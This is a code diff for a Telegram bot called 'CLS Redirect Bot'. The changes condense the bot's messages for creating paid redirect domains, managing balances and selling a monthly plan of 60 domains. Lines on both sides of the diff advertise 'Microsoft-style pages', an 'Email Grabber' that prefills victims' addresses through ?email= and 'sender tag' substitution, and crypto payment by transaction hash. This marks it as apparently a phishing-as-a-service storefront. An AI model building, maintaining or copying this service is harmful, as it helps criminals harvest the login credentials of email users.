@@ -786,7 +786,7 @@ if (bot) {
     );
 
     return ctx.reply(
-      `🎯 *Welcome to CLS Redirect Bot!*`,
+      `🎯 *CLS Redirect Bot*`,
       { 
         parse_mode: "Markdown",
         reply_markup: {
@@ -1043,12 +1043,7 @@ if (bot) {
         return;
       } else {
         await ctx.reply(
-          `❌ Invalid transaction hash format!\n\n` +
-          `Please provide either:\n` +
-          `📷 Screenshot of payment confirmation\n` +
-          `OR\n` +
-          `🔗 Valid transaction hash (TXID)\n\n` +
-          `Transaction hash should be at least 10 characters without spaces.`,
+          `❌ Invalid hash format\n\nProvide screenshot or valid transaction hash (10+ chars, no spaces)`,
           { parse_mode: "Markdown" }
         );
         return;
@@ -1207,33 +1202,27 @@ if (bot) {
 
       if (isAdminFree) {
         statusMessage = await ctx.reply(
-          `🎯 *CLS Redirect Creator*\n\n` +
-          `🚀 Creating redirect for: *${domain}*\n` +
-          `🎁 *${paymentType}* - Complimentary service\n\n` +
-          `⚡ *Status:* Setting up your redirect...\n` +
-          `🆔 Request ID: \`${requestId}\`\n\n` +
-          `⏳ Please wait while we work our magic...`,
+          `🎯 *Creating ${domain}*\n\n` +
+          `${paymentType} - Free\n` +
+          `ID: \`${requestId}\`\n\n` +
+          `⏳ Setting up...`,
           { parse_mode: "Markdown" },
         );
       } else if (isSubscriptionUse) {
         statusMessage = await ctx.reply(
-          `🎯 *CLS Redirect Creator*\n\n` +
-          `🚀 Creating redirect for: *${domain}*\n` +
-          `⭐ *${paymentType}* - Domain ${user.subscription.domainsUsed}/60\n\n` +
-          `⚡ *Status:* Setting up your redirect...\n` +
-          `🆔 Request ID: \`${requestId}\`\n\n` +
-          `⏳ Please wait while we work our magic...`,
+          `🎯 *Creating ${domain}*\n\n` +
+          `${paymentType} - ${user.subscription.domainsUsed}/60\n` +
+          `ID: \`${requestId}\`\n\n` +
+          `⏳ Setting up...`,
           { parse_mode: "Markdown" },
         );
       } else {
         statusMessage = await ctx.reply(
-          `🎯 *CLS Redirect Creator*\n\n` +
-          `🚀 Creating redirect for: *${domain}*\n` +
-          `💰 *${paymentType}*: $${cost} ✅\n` +
-          `💳 Remaining balance: $${user.balance.toFixed(2)}\n\n` +
-          `⚡ *Status:* Setting up your redirect...\n` +
-          `🆔 Request ID: \`${requestId}\`\n\n` +
-          `⏳ Please wait while we work our magic...`,
+          `🎯 *Creating ${domain}*\n\n` +
+          `${paymentType}: $${cost}\n` +
+          `Balance: $${user.balance.toFixed(2)}\n` +
+          `ID: \`${requestId}\`\n\n` +
+          `⏳ Setting up...`,
           { parse_mode: "Markdown" },
         );
       }
@@ -1297,14 +1286,12 @@ if (bot) {
 
         // Step 3: Replace status message with final results
         const responseMessage =
-          `🎉 *CLS Redirect Successfully Created!✅*\n\n` +
-          `🌐 *Your Domain:* \`${domain}\`\n\n` +
-          `🚀 *Live Redirect URLs:*\n` +
+          `✅ *${domain} Ready*\n\n` +
+          `🚀 *URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `Ask *Admin* for cloudflare namesever to link w ur domain\n\n` +
-          `*Email Grabber*: Add *?email=* to your link above\n` +
-          `*Usage:* yourlink.html?email=user@domain.com or replace user@domain.com w ur sender tag`;
+          `Ask admin for Cloudflare nameservers\n` +
+          `Email capture: add ?email= to links`;
 
         // Replace the status message with final results
         await ctx.telegram.editMessageText(
@@ -1428,9 +1415,7 @@ bot.on('callback_query', async (ctx) => {
       if (callbackData === 'topup') {
         session.awaiting_amount = true;
         return ctx.editMessageText(
-          `💎 *CLS Account Balance*: $${user.balance.toFixed(2)}\n\n` +
-          `Enter the amount you want to add (USD):\n` +
-          `Example: 50`,
+          `💎 *Balance*: $${user.balance.toFixed(2)}\n\nEnter USD amount:`,
           { parse_mode: "Markdown" }
         );
       }
@@ -1444,12 +1429,9 @@ bot.on('callback_query', async (ctx) => {
           const currentPrice = user.subscription.isFirstTime ? '$200' : '$200';
           
           return ctx.editMessageText(
-            `⭐ *Monthly Subscription - Active*\n\n` +
-            `🎯 *Benefits:* 60 domains per month for ${currentPrice}\n` +
-            `📅 *Expires:* ${endDate.toDateString()} (${daysLeft} days)\n` +
-            `🎯 *Domains Used:* ${user.subscription.domainsUsed}/60\n` +
-            `💰 *Savings:* $${((60 * 80) - 200).toFixed(2)} vs pay-per-domain\n\n` +
-            `✅ Your subscription is active and ready to use!`,
+            `⭐ *Subscription Active*\n\n` +
+            `📅 Expires: ${endDate.toDateString()} (${daysLeft} days)\n` +
+            `🎯 Used: ${user.subscription.domainsUsed}/60`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
@@ -1467,19 +1449,10 @@ bot.on('callback_query', async (ctx) => {
         const savings = (60 * 80) - subscriptionPrice;
         
         return ctx.editMessageText(
-            `⭐ *Monthly Subscription - $${subscriptionPrice}*\n\n` +
-            `🎯 *Get 60 domains per month for ${isFirstTime ? 'just $250 (first time)' : 'just $200 (renewal)'}!*\n` +
-            `💰 *Regular Price:* 60 × $80 = $4,800\n` +
-            `💰 *Subscription Price:* $${subscriptionPrice}\n` +
-            `💎 *You Save:* $${savings.toFixed(2)} (${Math.round((savings/4800)*100)}% off!)\n\n` +
-            `✨ *Benefits:*\n` +
-            `• 60 professional redirects monthly\n` +
-            `• All premium features included\n` +
-            `• Same quality Microsoft-style pages\n` +
-            `• SSL certificates & email capture\n` +
-            `• Real-time click tracking\n\n` +
-            (isFirstTime ? `🎊 *First-time subscriber bonus included!*\n\n` : '') +
-            `Current Balance: $${user.balance.toFixed(2)}`,
+            `⭐ *Monthly Plan - $${subscriptionPrice}*\n\n` +
+            `60 domains/month ${isFirstTime ? '(first time)' : '(renewal)'}\n` +
+            `Save: $${savings.toFixed(2)} vs pay-per-use\n\n` +
+            `Balance: $${user.balance.toFixed(2)}`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
@@ -2020,10 +1993,8 @@ bot.on('callback_query', async (ctx) => {
         
         if (user.balance < subscriptionPrice) {
           return ctx.editMessageText(
-            `❌ *Insufficient Balance*\n\n` +
-            `Required: $${subscriptionPrice} ${isFirstTime ? '(first-time)' : '(renewal)'}\n` +
-            `Current Balance: $${user.balance.toFixed(2)}\n` +
-            `Needed: $${(subscriptionPrice - user.balance).toFixed(2)}`,
+            `❌ *Need $${(subscriptionPrice - user.balance).toFixed(2)} more*\n\n` +
+            `Required: $${subscriptionPrice}\nBalance: $${user.balance.toFixed(2)}`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
@@ -2086,13 +2057,10 @@ bot.on('callback_query', async (ctx) => {
         const savings = (60 * 80) - subscriptionPrice;
         
         return ctx.editMessageText(
-          `🎉 *Subscription Activated!*\n\n` +
-          `⭐ *Monthly Plan Active* ${isFirstTime ? '(First-time subscriber!)' : '(Renewal)'}\n` +
-          `🎯 *Domains Available:* 60\n` +
-          `📅 *Valid Until:* ${user.subscription.endDate.toDateString()}\n` +
-          `💳 *Remaining Balance:* $${user.balance.toFixed(2)}\n\n` +
-          `✅ You can now create up to 60 domains this month!\n` +
-          `💰 You saved $${savings.toFixed(2)} compared to pay-per-domain!`,
+          `✅ *Subscription Active*\n\n` +
+          `60 domains available\n` +
+          `Expires: ${user.subscription.endDate.toDateString()}\n` +
+          `Balance: $${user.balance.toFixed(2)}`,
           { 
             parse_mode: "Markdown",
             reply_markup: {
@@ -2129,10 +2097,8 @@ bot.on('callback_query', async (ctx) => {
         session.force_payment = true; // Force payment even if subscription exists
 
         return ctx.editMessageText(
-          "🎯 *CLS Redirect Creator - Pay Per Use*\n\n" +
-            "✨ *Format:* `domain.com target-url`\n" +
-            "📝 *Example:* `mysite.com https://facebook.com`\n\n" +
-            `💰 *Service Cost:* $80`,
+          "🎯 *Pay Per Use - $80*\n\n" +
+            "Format: `domain.com target-url`",
           { parse_mode: "Markdown" }
         );
       }
